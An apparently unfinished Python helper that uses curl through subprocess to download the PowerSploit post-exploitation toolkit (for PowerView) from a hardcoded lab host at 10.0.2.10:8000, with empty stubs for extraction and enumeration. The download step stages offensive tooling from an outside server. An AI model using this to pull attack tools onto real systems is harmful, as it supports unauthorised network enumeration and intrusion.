import subprocess
import ipaddress

#I want to get powerview from server first

# server_ip_adress = input("Please enter servers IP adress:")
server_ip_adress = '10.0.2.4'
# print(ipaddress.ip_address(server_ip_adress))

class ip_address():
	def __init__(self):
		# self.address = input("Please enter servers IP adress:")
		self.address = "10.0.2.10"
		self.valid_address = ipaddress.ip_address(self.address)
		# self.port = int(input("Please input the port of the server:"))
		self.port = 8000

		
class curl_data():
	def __init__(self):
		self.command = "curl"
		self.url = input("Please enter the url of file.\nPress Enter if file is in default directory.")
		# self.url = ""

	def down_data(self,server):
		if self.url == "": #Use default URL
			self.command = f'{self.command} -o PowerSploit.zip http://{server.address}:{server.port}/PowerSploit-master_3.zip'
			self.output = subprocess.run(self.command,shell=True)
			#print(self.output)

	def extract_data(self):
		self.extract_cmd = f''


class enumerate():
	def __init__(self):
		self.file_name = "{self}_PowerSploit.txt"




server = ip_address()
link = curl_data()
link.down_data(server)
